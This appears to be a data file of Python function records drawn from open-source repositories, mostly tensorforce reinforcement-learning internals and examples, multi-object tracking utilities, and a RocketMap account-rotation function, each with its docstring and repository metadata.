{"docstring": "# Yay for thread safety.\n", "func_signal": "def next(self, set_name, coords_to_scan):\n", "code": "with self.next_lock:\n    # Readability.\n    account_set = self.sets[set_name]\n\n    # Loop all accounts for a good one.\n    now = default_timer()\n\n    for i in range(len(account_set)):\n        account = account_set[i]\n\n        # Make sure it's not in use.\n        if account.get('in_use', False):\n            continue\n\n        # Make sure it's not captcha'd.\n        if account.get('captcha', False):\n            continue\n\n        # Check if we're below speed limit for account.\n        last_scanned = account.get('last_scanned', False)\n\n        if last_scanned and self.kph > 0:\n            seconds_passed = now - last_scanned\n            old_coords = account.get('last_coords', coords_to_scan)\n\n            distance_m = distance(old_coords, coords_to_scan)\n\n            cooldown_time_sec = distance_m / self.kph * 3.6\n\n            # Not enough time has passed for this one.\n            if seconds_passed < cooldown_time_sec:\n                continue\n\n        # We've found an account that's ready.\n        account['last_scanned'] = now\n        account['last_coords'] = coords_to_scan\n        account['in_use'] = True\n\n        return account\n\n# TODO: Instead of returning False, return the amount of min. seconds\n# the instance needs to wait until the first account becomes available,\n# so it doesn't need to keep asking if we know we need to wait.\nreturn False", "path": "RocketMap/pogom/account.py", "commit_date": "2018-03-07 00:00:00", "repo_name": "RocketMap/RocketMap", "stars": 2805, "license": "agpl-3.0", "language": "python", "size": 57069}
{"docstring": "# Deterministic: maximum likelihood action\n", "func_signal": "def fn_mode():\n", "code": "action = tf.math.argmax(input=action_values, axis=-1)\nreturn tf_util.cast(x=action, dtype='int')", "path": "tensorforce/tensorforce/core/distributions/categorical.py", "commit_date": "2020-11-08 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# FEATURES.MD\n", "func_signal": "def test_masking(self):\n", "code": "self.start_tests(name='masking')\n\nagent = Agent.create(agent=self.agent_spec(\n    states=dict(type='float', shape=(10,)),\n    actions=dict(type='int', shape=(), num_values=3)\n))\n\nstates = dict(\n    state=np.random.random_sample(size=(10,)),  # state (default name: \"state\")\n    action_mask=[True, False, True]  # mask as'[ACTION-NAME]_mask' (default name: \"action\")\n)\naction = agent.act(states=states)\nassert action != 1", "path": "tensorforce/test/test_features.py", "commit_date": "2020-08-26 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "\"\"\"Returns a predefined dict of sensors specifications\"\"\"\n", "func_signal": "def default_sensors(self) -> dict:\n", "code": "return dict(imu=SensorSpecs.imu(),\n            collision=SensorSpecs.collision_detector(callback=self.on_collision),\n            camera=SensorSpecs.rgb_camera(position='top',\n                                          image_size_x=self.window_size[0], image_size_y=self.window_size[1],\n                                          sensor_tick=self.tick_time))", "path": "tensorforce/tensorforce/environments/carla_environment.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "\"\"\"\nTrain agent on experience collected in parallel from 2 CartPole environments running on\nanother machine.\n\nTypical use case: same as mode 2, but generally remote communication socket > process\n\nSimulate remote environment, usually run on another machine via:\n    python run.py --environment gym --level CartPole-v1 --remote socket-server --port 65432\n\"\"\"\n", "func_signal": "def socket():\n", "code": "agent = 'benchmarks/configs/ppo.json'\nenvironment = 'benchmarks/configs/cartpole.json'\n\ndef server(port):\n    Environment.create(environment=environment, remote='socket-server', port=port)\n\nserver1 = Thread(target=server, kwargs=dict(port=65432))\nserver2 = Thread(target=server, kwargs=dict(port=65433))\nserver1.start()\nserver2.start()\n\nrunner = Runner(\n    agent=agent, num_parallel=2, remote='socket-client', host='127.0.0.1', port=65432\n)\nrunner.run(num_episodes=100)  # optional: batch_agent_calls=True\nrunner.close()\n\nserver1.join()\nserver2.join()", "path": "tensorforce/examples/parallelization.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# OpenAI-Gym environment specification\n", "func_signal": "def main():\n", "code": "environment = dict(environment='gym', level='CartPole-v1')\n# or: environment = Environment.create(\n#         environment='gym', level='CartPole-v1', max_episode_timesteps=500)\n\n# PPO agent specification\nagent = dict(\n    agent='ppo',\n    # Automatically configured network\n    network='auto',\n    # PPO optimization parameters\n    batch_size=10, update_frequency=2, learning_rate=3e-4, multi_step=10,\n    subsampling_fraction=0.33,\n    # Reward estimation\n    likelihood_ratio_clipping=0.2, discount=0.99, predict_terminal_values=False,\n    # Baseline network and optimizer\n    baseline=dict(type='auto', size=32, depth=1),\n    baseline_optimizer=dict(optimizer='adam', learning_rate=1e-3, multi_step=10),\n    # Regularization\n    l2_regularization=0.0, entropy_regularization=0.0,\n    # Preprocessing\n    state_preprocessing='linear_normalization', reward_preprocessing=None,\n    # Exploration\n    exploration=0.0, variable_noise=0.0,\n    # Default additional config values\n    config=None,\n    # Save agent every 10 updates and keep the 5 most recent checkpoints\n    saver=dict(directory='model', frequency=10, max_checkpoints=5),\n    # Log all available Tensorboard summaries\n    summarizer=dict(directory='summaries', summaries='all'),\n    # Do not record agent-environment interaction trace\n    recorder=None\n)\n# or: Agent.create(agent='ppo', environment=environment, ...)\n# with additional argument \"environment\" and, if applicable, \"parallel_interactions\"\n\n# Initialize the runner\nrunner = Runner(agent=agent, environment=environment, max_episode_timesteps=500)\n\n# Train for 200 episodes\nrunner.run(num_episodes=200)\nrunner.close()\n\n# plus agent.close() and environment.close() if created separately", "path": "tensorforce/examples/quickstart.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "\"\"\"\nTrain agent on experience collected in parallel from one vectorized CartPole environment.\n\nTypical use case:\n    time for vectorized environment < time for sequential execution\n\"\"\"\n", "func_signal": "def local_vectorized():\n", "code": "agent = 'benchmarks/configs/ppo.json'\nenvironment = 'custom_cartpole'\nrunner = Runner(agent=agent, environment=environment, max_episode_timesteps=500, num_parallel=4)\nrunner.run(num_episodes=100)\nrunner.close()", "path": "tensorforce/examples/parallelization.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "\"\"\"An example reward function. Subclass to define your own.\"\"\"\n", "func_signal": "def reward(self, actions, time_cost=-1.0, a=2.0):\n", "code": "speed = env_utils.speed(self.vehicle)\nspeed_limit = self.vehicle.get_speed_limit()\n\nif speed <= speed_limit:\n    speed_penalty = 0.0\nelse:\n    speed_penalty = a * (speed_limit - speed)\n\nreturn time_cost - self.collision_penalty + speed_penalty", "path": "tensorforce/tensorforce/environments/carla_environment.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Baseline horizon\n", "func_signal": "def predict_terminal_value():\n", "code": "baseline_horizon = self.baseline.past_horizon(on_policy=True)\nbaseline_horizon = tf.math.minimum(x=baseline_horizon, y=episode_length)\n\n# Single-step horizon\nhorizon_start = episode_length - one - baseline_horizon\nhorizons = tf.expand_dims(\n    input=tf.stack(values=(zero, baseline_horizon + one)), axis=0\n)\n\n# Predict values\nif self.predict_action_values:\n    # TODO: option to re-sample action deterministically?\n    # Use given actions since early estimate\n    # if self.separate_baseline:\n    #     policy_horizon = self.policy.past_horizon(on_policy=True)\n    #     policy_horizon = tf.math.minimum(x=policy_horizon, y=episode_length)\n    #     policy_horizon_start = terminal_index - policy_horizon\n    # else:\n    #     policy_horizon_start = past_horizon_start\n    # deterministic = tf_util.constant(value=True, dtype='bool')\n    # _actions, _ = self.policy.act(\n    #     states=states[policy_horizon_start:], horizons=horizons[:maybe_one],\n    #     internals=internals['policy'][policy_horizon_start: policy_horizon_start + maybe_one],\n    #     auxiliaries=auxiliaries[terminal_index:], deterministic=deterministic,\n    #     independent=True\n    # )\n    terminal_value = self.baseline.action_value(\n        states=states[horizon_start:], horizons=horizons,\n        internals=internals[horizon_start: horizon_start + one],\n        auxiliaries=auxiliaries[-1:],\n        actions=actions[-1:]\n    )\nelse:\n    terminal_value = self.baseline.state_value(\n        states=states[horizon_start:], horizons=horizons,\n        internals=internals[horizon_start: horizon_start + one],\n        auxiliaries=auxiliaries[-1:]\n    )\n\n# Modification to correct for use as initializer in tf.scan\n# (-reward[-1] since terminal state value will be predicted)\nreturn (terminal_value[0] - reward[-1]) / reward_discount", "path": "tensorforce/tensorforce/core/models/tensorforce.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Gather values from buffers, and episode experience\n", "func_signal": "def fn_terminal():\n", "code": "function = (lambda x: x[parallel, :buffer_index])\nstates = self.states_buffer.fmap(function=function, cls=TensorDict)\ninternals = self.internals_buffer.fmap(function=function, cls=TensorDict)\nauxiliaries = self.auxiliaries_buffer.fmap(function=function, cls=TensorDict)\nactions = self.actions_buffer.fmap(function=function, cls=TensorDict)\nepisode_terminal = self.terminal_buffer[parallel, :buffer_index - batch_size]\nepisode_reward = self.reward_buffer[parallel, :buffer_index - batch_size]\nepisode_terminal = tf.concat(values=(episode_terminal, terminal), axis=0)\nepisode_reward = tf.concat(values=(episode_reward, reward), axis=0)\nreturn self.core_experience(\n    states=states, internals=internals, auxiliaries=auxiliaries, actions=actions,\n    terminal=episode_terminal, reward=episode_reward\n)", "path": "tensorforce/tensorforce/core/models/tensorforce.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Update terminal/reward buffers\n", "func_signal": "def fn_nonterminal():\n", "code": "assignments = list()\nindices = tf.range(start=(buffer_index - batch_size), limit=buffer_index)\nindices = tf.stack(values=(batch_parallel, indices), axis=1)\nvalue = tf.tensor_scatter_nd_update(\n    tensor=self.terminal_buffer, indices=indices, updates=terminal\n)\nassignments.append(self.terminal_buffer.assign(value=value))\nvalue = tf.tensor_scatter_nd_update(\n    tensor=self.reward_buffer, indices=indices, updates=reward\n)\nassignments.append(self.reward_buffer.assign(value=value))\nreturn tf.group(assignments)", "path": "tensorforce/tensorforce/core/models/tensorforce.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "\"\"\"Specifies the mapping between an actions vector and the vehicle's control.\"\"\"\n# throttle and brake are mutual exclusive:\n", "func_signal": "def actions_to_control(self, actions):\n", "code": "self.control.throttle = float(actions[0]) if actions[0] > 0 else 0.0\nself.control.brake = float(-actions[0]) if actions[0] < 0 else 0.0\n\n# steering\nself.control.steer = float(actions[1])\n\n# reverse motion:\nself.control.reverse = bool(actions[2] > 0)", "path": "tensorforce/tensorforce/environments/carla_environment.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Core update\n", "func_signal": "def update(self):\n", "code": "updated = self.core_update()\n\nwith tf.control_dependencies(control_inputs=(updated,)):\n    return tf_util.identity(input=self.updates)", "path": "tensorforce/tensorforce/core/models/tensorforce.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "\"\"\"\nTrain agent on experience collected in parallel from 4 CartPole environments running in\nseparate processes.\n\nTypical use case:\n    (a) time for batched agent.act() ~ time for agent.act()\n                    > time for environment.execute() + remote communication\n        --> batch_agent_calls = True\n    (b) time for environment.execute() > time for agent.act() + process communication\n        --> batch_agent_calls = False\n\"\"\"\n", "func_signal": "def multiprocessing():\n", "code": "agent = 'benchmarks/configs/ppo.json'\nenvironment = 'benchmarks/configs/cartpole.json'\nrunner = Runner(agent=agent, environment=environment, num_parallel=4, remote='multiprocessing')\nrunner.run(num_episodes=100, batch_agent_calls=True)  # optional: batch_agent_calls=True\nrunner.close()", "path": "tensorforce/examples/parallelization.py", "commit_date": "2020-12-30 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Set logits to minimal value\n", "func_signal": "def fn_sample():\n", "code": "min_float = tf.fill(dims=tf.shape(input=logits), value=tf_util.get_dtype(type='float').min)\ntemp_logits = logits / tf.math.maximum(x=temperature, y=epsilon)\ntemp_logits = tf.where(condition=(probabilities < epsilon), x=min_float, y=temp_logits)\n\n# Non-deterministic: sample action using Gumbel distribution\none = tf_util.constant(value=1.0, dtype='float')\nuniform_distribution = tf.random.uniform(\n    shape=tf.shape(input=temp_logits), minval=epsilon, maxval=(one - epsilon),\n    dtype=tf_util.get_dtype(type='float')\n)\n# Second log numerically stable since log(1-eps) ~ -eps\ngumbel_distribution = -tf.math.log(x=-tf.math.log(x=uniform_distribution))\naction = tf.math.argmax(input=(temp_logits + gumbel_distribution), axis=-1)\nreturn tf_util.cast(x=action, dtype='int')", "path": "tensorforce/tensorforce/core/distributions/categorical.py", "commit_date": "2020-11-08 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# init actor\n", "func_signal": "def _reset_world(self, soft=False):\n", "code": "if not soft:\n    spawn_point = env_utils.random_spawn_point(self.map)\nelse:\n    spawn_point = self.spawn_point\n\nif self.vehicle is None:\n    blueprint = env_utils.random_blueprint(self.world, actor_filter=self.vehicle_filter)\n    self.vehicle = env_utils.spawn_actor(self.world, blueprint, spawn_point)  # type: carla.Vehicle\n\n    self._create_sensors()\n    self.synchronous_context = CARLASyncContext(self.world, self.sensors, fps=self.fps)\nelse:\n    self.vehicle.apply_control(carla.VehicleControl())\n    self.vehicle.set_velocity(carla.Vector3D(x=0.0, y=0.0, z=0.0))\n    self.vehicle.set_transform(spawn_point)\n\n# reset reward variables\nself.collision_penalty = 0.0", "path": "tensorforce/tensorforce/environments/carla_environment.py", "commit_date": "2020-07-18 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Gather values from buffers\n", "func_signal": "def fn_terminal():\n", "code": "indices = tf.range(start=buffer_start, limit=buffer_index)\nindices = tf.math.mod(x=indices, y=capacity)\nfunction = (lambda x: tf.gather(params=x[parallel], indices=indices))\nstates = self.states_buffer.fmap(function=function, cls=TensorDict)\ninternals = self.internals_buffer.fmap(function=function, cls=TensorDict)\nauxiliaries = self.auxiliaries_buffer.fmap(function=function, cls=TensorDict)\nactions = self.actions_buffer.fmap(function=function, cls=TensorDict)\nindices = tf.range(buffer_start, buffer_index - batch_size)\nindices = tf.math.mod(x=indices, y=capacity)\nepisode_terminal = tf.gather(params=self.terminal_buffer[parallel], indices=indices)\nepisode_reward = tf.gather(params=self.reward_buffer[parallel], indices=indices)\nepisode_terminal = tf.concat(values=(episode_terminal, terminal), axis=0)\nepisode_reward = tf.concat(values=(episode_reward, reward), axis=0)\n\n# Episode experience\nexperienced = self.core_experience(\n    states=states, internals=internals, auxiliaries=auxiliaries, actions=actions,\n    terminal=episode_terminal, reward=episode_reward\n)\n\n# Increment buffer start index\nwith tf.control_dependencies(control_inputs=(indices,)):\n    zeros = tf_util.zeros(shape=(1,), dtype='int')\n    value = tf.tensor_scatter_nd_update(\n        tensor=self.buffer_start, indices=expanded_parallel, updates=zeros\n    )\n    assignment = self.buffer_start.assign(value=value)\n    # sparse_delta = tf.IndexedSlices(values=zero, indices=parallel)\n    # assignment = self.buffer_start.scatter_update(sparse_delta=sparse_delta)\n\nreturn tf.group((experienced, assignment))", "path": "tensorforce/tensorforce/core/models/tensorforce.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Update terminal/reward buffers\n", "func_signal": "def fn_nonterminal():\n", "code": "assignments = list()\nindices = tf.range(start=(buffer_index - batch_size), limit=buffer_index)\nindices = tf.math.mod(x=indices, y=capacity)\nindices = tf.stack(values=(batch_parallel, indices), axis=1)\nvalue = tf.tensor_scatter_nd_update(\n    tensor=self.terminal_buffer, indices=indices, updates=terminal\n)\nassignments.append(self.terminal_buffer.assign(value=value))\nvalue = tf.tensor_scatter_nd_update(\n    tensor=self.reward_buffer, indices=indices, updates=reward\n)\nassignments.append(self.reward_buffer.assign(value=value))\nwith tf.control_dependencies(control_inputs=assignments):\n    # Number of completed timesteps to process\n    num_complete = buffer_index - buffer_start - reward_horizon\n\n    def true_fn():\n        return self._nonterminal_experience(\n            parallel=parallel, buffer_start=buffer_start, buffer_index=buffer_index,\n            reward_horizon=reward_horizon, num_complete=num_complete,\n            reward_discount=reward_discount\n        )\n\n    return tf.cond(pred=(num_complete > zero), true_fn=true_fn, false_fn=tf.no_op)", "path": "tensorforce/tensorforce/core/models/tensorforce.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Timestep counter\n", "func_signal": "def core_initialize(self):\n", "code": "self.timesteps = self.variable(\n    name='timesteps', spec=TensorSpec(type='int'), initializer='zeros', is_trainable=False,\n    is_saved=True\n)\n\n# Episode counter\nself.episodes = self.variable(\n    name='episodes', spec=TensorSpec(type='int'), initializer='zeros', is_trainable=False,\n    is_saved=True\n)\n\n# Update counter\nself.updates = self.variable(\n    name='updates', spec=TensorSpec(type='int'), initializer='zeros', is_trainable=False,\n    is_saved=True\n)\n\n# Episode length/reward\nself.episode_length = self.variable(\n    name='episode-length', spec=TensorSpec(type='int', shape=(self.parallel_interactions,)),\n    initializer='zeros', is_trainable=False, is_saved=False\n)\nself.episode_reward = self.variable(\n    name='episode-reward',\n    spec=TensorSpec(type=self.reward_spec.type, shape=(self.parallel_interactions,)),\n    initializer='zeros', is_trainable=False, is_saved=False\n)\n\n# Internals buffers\ndef function(name, spec, initial):\n    shape = (self.parallel_interactions,) + spec.shape\n    reps = (self.parallel_interactions,) + tuple(1 for _ in range(spec.rank))\n    initializer = np.tile(np.expand_dims(initial, axis=0), reps=reps)\n    return self.variable(\n        name=(name + '-buffer'), spec=TensorSpec(type=spec.type, shape=shape),\n        initializer=initializer, is_trainable=False, is_saved=False\n    )\n\nself.previous_internals = self.internals_spec.fmap(\n    function=function, cls=VariableDict, with_names=True, zip_values=self.initial_internals\n)", "path": "tensorforce/tensorforce/core/models/model.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Gather values from buffers, and episode experience\n", "func_signal": "def fn_terminal():\n", "code": "function = (lambda x: x[parallel, :buffer_index])\nstates = self.states_buffer.fmap(function=function, cls=TensorDict)\ninternals = self.internals_buffer.fmap(function=function, cls=TensorDict)\nauxiliaries = self.auxiliaries_buffer.fmap(function=function, cls=TensorDict)\nactions = self.actions_buffer.fmap(function=function, cls=TensorDict)\nreturn self.core_experience(\n    states=states, internals=internals, auxiliaries=auxiliaries, actions=actions,\n    terminal=terminal, reward=reward\n)", "path": "tensorforce/tensorforce/core/models/tensorforce.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "# Appropriate terminal function above\n", "func_signal": "def fn_terminal_continuation():\n", "code": "operations = [fn_terminal()]\n\n# Reset buffer index\nwith tf.control_dependencies(control_inputs=operations):\n    updates = tf_util.zeros(shape=(1,), dtype='int')\n    indices = tf.expand_dims(input=tf.expand_dims(input=parallel, axis=0), axis=1)\n    value = tf.tensor_scatter_nd_update(\n        tensor=self.buffer_index, indices=indices, updates=updates\n    )\n    operations.append(self.buffer_index.assign(value=value))\n    # sparse_delta = tf.IndexedSlices(values=zero, indices=parallel)\n    # operations.append(self.buffer_index.scatter_update(sparse_delta=sparse_delta))\n\n# Preprocessed episode reward summaries (before preprocessed episode reward reset)\nif self.reward_preprocessing is not None:\n    dependencies = list()\n    if self.summaries == 'all' or 'reward' in self.summaries:\n        with self.summarizer.as_default():\n            x = tf.gather(params=self.preprocessed_episode_reward, indices=parallel)\n            dependencies.append(tf.summary.scalar(\n                name='preprocessed-episode-reward', data=x, step=self.episodes\n            ))\n\n    # Reset preprocessed episode reward\n    with tf.control_dependencies(control_inputs=dependencies):\n        zeros = tf_util.zeros(shape=(1,), dtype='float')\n        value = tf.tensor_scatter_nd_update(\n            tensor=self.preprocessed_episode_reward, indices=expanded_parallel,\n            updates=zeros\n        )\n        operations.append(self.preprocessed_episode_reward.assign(value=value))\n        # zero_float = tf_util.constant(value=0.0, dtype='float')\n        # sparse_delta = tf.IndexedSlices(values=zero_float, indices=parallel)\n        # operations.append(\n        #     self.preprocessed_episode_reward.scatter_update(sparse_delta=sparse_delta)\n        # )\n\n# Reset preprocessors\nfor preprocessor in self.state_preprocessing.values():\n    operations.append(preprocessor.reset())\nif self.reward_preprocessing is not None:\n    operations.append(self.reward_preprocessing.reset())\n\nreturn tf.group(*operations)", "path": "tensorforce/tensorforce/core/models/tensorforce.py", "commit_date": "2020-12-22 00:00:00", "repo_name": "tensorforce/tensorforce", "stars": 3273, "license": "apache-2.0", "language": "python", "size": 28746}
{"docstring": "\"\"\"Convert bounding box to format `(center x, center y, aspect ratio,\nheight)`, where the aspect ratio is `width / height`.\n\"\"\"\n", "func_signal": "def tlwh_to_xyah(tlwh):\n", "code": "ret = np.asarray(tlwh).copy()\nret[:2] += ret[2:] / 2\nret[2] /= ret[3]\nreturn ret", "path": "Towards-Realtime-MOT/tracker/multitracker.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"Start a new tracklet\"\"\"\n", "func_signal": "def activate(self, kalman_filter, frame_id):\n", "code": "self.kalman_filter = kalman_filter\nself.track_id = self.next_id()\nself.mean, self.covariance = self.kalman_filter.initiate(self.tlwh_to_xyah(self._tlwh))\n\nself.tracklet_len = 0\nself.state = TrackState.Tracked\n#self.is_activated = True\nself.frame_id = frame_id\nself.start_frame = frame_id", "path": "Towards-Realtime-MOT/tracker/multitracker.py", "commit_date": "2020-03-20 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "# Rescale x1, y1, x2, y2 from 416 to image size\n", "func_signal": "def scale_coords(img_size, coords, img0_shape):\n", "code": "gain_w = float(img_size[0]) / img0_shape[1]  # gain  = old / new\ngain_h = float(img_size[1]) / img0_shape[0]\ngain = min(gain_w, gain_h)\npad_x = (img_size[0] - img0_shape[1] * gain) / 2  # width padding\npad_y = (img_size[1] - img0_shape[0] * gain) / 2  # height padding\ncoords[:, [0, 2]] -= pad_x\ncoords[:, [1, 3]] -= pad_y\ncoords[:, 0:4] /= gain\ncoords[:, :4] = torch.clamp(coords[:, :4], min=0)\nreturn coords", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\" We resize both tensors to [A,B,2] without new malloc:\n[A,2] -> [A,1,2] -> [A,B,2]\n[B,2] -> [1,B,2] -> [A,B,2]\nThen we compute the area of intersect between box_a and box_b.\nArgs:\n  box_a: (tensor) bounding boxes, Shape: [n,A,4].\n  box_b: (tensor) bounding boxes, Shape: [n,B,4].\nReturn:\n  (tensor) intersection area, Shape: [n,A,B].\n\"\"\"\n", "func_signal": "def intersect(box_a, box_b):\n", "code": "n = box_a.size(0)\nA = box_a.size(1)\nB = box_b.size(1)\nmax_xy = torch.min(box_a[:, :, 2:].unsqueeze(2).expand(n, A, B, 2),\n                   box_b[:, :, 2:].unsqueeze(1).expand(n, A, B, 2))\nmin_xy = torch.max(box_a[:, :, :2].unsqueeze(2).expand(n, A, B, 2),\n                   box_b[:, :, :2].unsqueeze(1).expand(n, A, B, 2))\ninter = torch.clamp((max_xy - min_xy), min=0)\nreturn inter[:, :, :, 0] * inter[:, :, :, 1]", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "# Convert bounding box format from [x, y, w, h] to [x1, y1, x2, y2]\n# x, y are coordinates of center \n# (x1, y1) and (x2, y2) are coordinates of bottom left and top right respectively. \n", "func_signal": "def xywh2xyxy(x):\n", "code": "y = torch.zeros_like(x) if x.dtype is torch.float32 else np.zeros_like(x)\ny[:, 0] = (x[:, 0] - x[:, 2] / 2)  # Bottom left x\ny[:, 1] = (x[:, 1] - x[:, 3] / 2)  # Bottom left y\ny[:, 2] = (x[:, 0] + x[:, 2] / 2)  # Top right x\ny[:, 3] = (x[:, 1] + x[:, 3] / 2)  # Top right y\nreturn y", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"\nPlot YOLO training results from the file 'results.txt'\nExample of what this is trying to plot can be found at: \nhttps://user-images.githubusercontent.com/26833433/63258271-fe9d5300-c27b-11e9-9a15-95038daf4438.png\nAn example results.txt file:\nimport os; os.system('wget https://storage.googleapis.com/ultralytics/yolov3/results_v1.txt')\n\"\"\"\n", "func_signal": "def plot_results():\n", "code": "plt.figure(figsize=(14, 7))\ns = ['X + Y', 'Width + Height', 'Confidence', 'Classification', 'Total Loss', 'mAP', 'Recall', 'Precision']\nfiles = sorted(glob.glob('results*.txt'))\nfor f in files:\n    results = np.loadtxt(f, usecols=[2, 3, 4, 5, 6, 9, 10, 11]).T  # column 11 is mAP\n    x = range(1, results.shape[1])\n    for i in range(8):\n        plt.subplot(2, 4, i + 1)\n        plt.plot(x, results[i, x], marker='.', label=f)\n        plt.title(s[i])\n        if i == 0:\n            plt.legend()", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "# results\n", "func_signal": "def eval_frame(self, frame_id, trk_tlwhs, trk_ids, rtn_events=False):\n", "code": "trk_tlwhs = np.copy(trk_tlwhs)\ntrk_ids = np.copy(trk_ids)\n\n# gts\ngt_objs = self.gt_frame_dict.get(frame_id, [])\ngt_tlwhs, gt_ids = unzip_objs(gt_objs)[:2]\n\n# ignore boxes\nignore_objs = self.gt_ignore_frame_dict.get(frame_id, [])\nignore_tlwhs = unzip_objs(ignore_objs)[0]\n\n\n# remove ignored results\nkeep = np.ones(len(trk_tlwhs), dtype=bool)\niou_distance = mm.distances.iou_matrix(ignore_tlwhs, trk_tlwhs, max_iou=0.5)\nif len(iou_distance) > 0:\n    match_is, match_js = mm.lap.linear_sum_assignment(iou_distance)\n    match_is, match_js = map(lambda a: np.asarray(a, dtype=int), [match_is, match_js])\n    match_ious = iou_distance[match_is, match_js]\n\n    match_js = np.asarray(match_js, dtype=int)\n    match_js = match_js[np.logical_not(np.isnan(match_ious))]\n    keep[match_js] = False\n    trk_tlwhs = trk_tlwhs[keep]\n    trk_ids = trk_ids[keep]\n\n# get distance matrix\niou_distance = mm.distances.iou_matrix(gt_tlwhs, trk_tlwhs, max_iou=0.5)\n\n# acc\nself.acc.update(gt_ids, trk_ids, iou_distance)\n\nif rtn_events and iou_distance.size > 0 and hasattr(self.acc, 'last_mot_events'):\n    events = self.acc.last_mot_events  # only supported by https://github.com/longcw/py-motmetrics\nelse:\n    events = None\nreturn events", "path": "Towards-Realtime-MOT/utils/evaluation.py", "commit_date": "2020-01-29 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
{"docstring": "\"\"\"\nRemoves detections with lower object confidence score than 'conf_thres'\nNon-Maximum Suppression to further filter detections.\nReturns detections with shape:\n    (x1, y1, x2, y2, object_conf, class_score, class_pred)\nArgs:\n    prediction,\n    conf_thres,\n    nms_thres,\n    method = 'standard' or 'fast'\n\"\"\"\n\n", "func_signal": "def non_max_suppression(prediction, conf_thres=0.5, nms_thres=0.4, method='standard'):\n", "code": "output = [None for _ in range(len(prediction))]\nfor image_i, pred in enumerate(prediction):\n    # Filter out confidence scores below threshold\n    # Get score and class with highest confidence\n\n    v = pred[:, 4] > conf_thres\n    v = v.nonzero().squeeze()\n    if len(v.shape) == 0:\n        v = v.unsqueeze(0)\n\n    pred = pred[v]\n\n    # If none are remaining => process next image\n    nP = pred.shape[0]\n    if not nP:\n        continue\n    # From (center x, center y, width, height) to (x1, y1, x2, y2)\n    pred[:, :4] = xywh2xyxy(pred[:, :4])\n\n    \n    # Non-maximum suppression\n    if method == 'standard':\n        nms_indices = nms(pred[:, :4], pred[:, 4], nms_thres)\n    elif method == 'fast':\n        nms_indices = fast_nms(pred[:, :4], pred[:, 4], iou_thres=nms_thres, conf_thres=conf_thres)\n    else:\n        raise ValueError('Invalid NMS type!')\n    det_max = pred[nms_indices]        \n\n    if len(det_max) > 0:\n        # Add max detections to outputs\n        output[image_i] = det_max if output[image_i] is None else torch.cat((output[image_i], det_max))\n\nreturn output", "path": "Towards-Realtime-MOT/utils/utils.py", "commit_date": "2020-03-14 00:00:00", "repo_name": "Zhongdao/Towards-Realtime-MOT", "stars": 2338, "license": "mit", "language": "python", "size": 21929}
